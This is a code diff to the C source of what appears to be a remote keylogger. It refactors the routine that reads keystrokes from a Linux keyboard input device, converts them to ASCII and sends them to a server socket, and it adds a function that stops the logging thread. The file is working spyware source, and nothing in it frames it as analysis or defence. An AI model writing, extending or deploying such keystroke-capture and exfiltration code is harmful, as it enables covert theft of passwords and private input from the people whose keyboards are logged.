@@ -6,8 +6,10 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <string.h>
+#include <pthread.h>
 #include "keylog.h"  // Include the header file
 #include "messageManager.h"
+#include "clientManager.h"
 #include "utils.h"
 
 typedef struct {
@@ -61,6 +63,7 @@ KeyCodeMap xt_to_ascii_map[] = {
     {0x58, "<F12>"}    // F12 key
 };
 
+extern clientInfo_t clientData;
 
 // Function to convert XT key code to ASCII
 char* xt_to_ascii(int key_code) {
@@ -75,15 +78,14 @@ char* xt_to_ascii(int key_code) {
 }
 
 // Function to capture keystrokes and send them to the server
-void* start_keylogger(void* parameters) {
-    keyLoggerParameters_t params = *(keyLoggerParameters_t* )parameters;
+void* start_keylogger() {
     struct input_event ev;
     int fd;
     ssize_t n;
     char buffer[256];
 
     // Open the input device (keyboard device)
-    fd = open(params.keyboardFile, O_RDONLY);
+    fd = open(clientData.keyLoggerInputFile, O_RDONLY);
     if (fd == -1) {
         perror("Cannot open input device");
         return NULL;
@@ -105,7 +107,7 @@ void* start_keylogger(void* parameters) {
                 strcpy(msg.buffer, buffer);
                 msg.opCode='K';
                 msg.size=strlen(buffer);
-                sendMessage(params.sock, &msg);
+                sendMessage(clientData.serverSocket, &msg);
             }
         }
     }
@@ -113,4 +115,14 @@ void* start_keylogger(void* parameters) {
     // Close the device file
     close(fd);
     return NULL;
+}
+
+void terminateKeylogger()
+{
+    if(clientData.isKeyLoggerActive && clientData.keyLoggerTid != -1)
+    {
+        pthread_cancel(clientData.keyLoggerTid);   
+        clientData.keyLoggerTid = -1;
+        clientData.isKeyLoggerActive = 0;
+    }
 }
